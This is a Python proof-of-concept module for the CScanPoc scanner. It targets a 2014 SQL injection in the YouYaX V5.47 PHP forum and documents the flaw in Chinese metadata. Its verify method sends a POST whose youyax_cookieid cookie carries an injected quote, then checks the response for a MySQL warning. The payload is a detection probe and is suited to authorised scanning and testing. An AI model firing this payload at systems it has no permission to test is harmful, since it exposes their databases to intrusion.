# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'YouYaX_0001'  # 平台漏洞编号，留空
    name = 'YouYaX V5.47 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-09-09'  # 漏洞公布时间
    desc = '''
        YouYaX是用PHP语言编写的一套通用论坛系统。秉承简洁实用的设计原则，将传统论坛中一些复杂臃肿的部分统统去掉，保留论坛交流的本质核心，拥有自己独特的原创风格和特性，并且在不断优化和改进。
        YouYaX，问题出现在ORG/YouYa.php文件中。第356行：
        对传入的param参数没有进行过滤，导致存在SQL注入危险。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/1847/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'YouYaX'  # 漏洞应用名称
    product_version = 'V5.47'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f8816176-7a74-46f0-bbc8-20d3dd0a9b9c'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-20'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            headers = {
                'Cookie': "PHPSESSID=c96cea77189bb59f33c6f4923513b54a; youyax_data=1; youyax_user=qwerty; youyax_bz=1; youyax_cookieid=0c56f4af01da95954aa7fc60006498d8'"
            }
            r = requests.post(self.target, headers=headers)

            if 'Warning' in r.text and 'mysql_num_row()' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
